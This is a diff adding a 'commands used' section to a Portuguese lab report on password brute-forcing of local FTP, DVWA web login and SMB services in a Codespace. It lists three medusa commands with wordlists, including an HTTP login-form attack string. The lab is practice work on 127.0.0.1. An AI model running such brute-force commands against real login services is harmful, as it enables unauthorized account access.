@@ -23,3 +23,14 @@ O DVWA foi configurado em nível baixo e testado apenas no ambiente local. O Med
  ## Conclusão
 
  O laboratório permitiu praticar testes controlados e observar que resultados automatizados precisam ser validados. O teste FTP foi confirmado; os resultados web e SMB permaneceram inconclusivos. Os serviços foram testados localmente no Codespace.
+ ## Comandos usados nos testes
+
+### FTP
+medusa -h 127.0.0.1 -u ftpuser -P wordlists/senhas_ftp.txt -M ftp
+
+### DVWA (HTTP)
+medusa -h 127.0.0.1 -n 4280 -u admin -P wordlists/senhas_web.txt -M http -m FORM:"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+### SMB
+medusa -h 127.0.0.1 -u smbuser -P wordlists/senhas_smb.txt -M smbnt
+
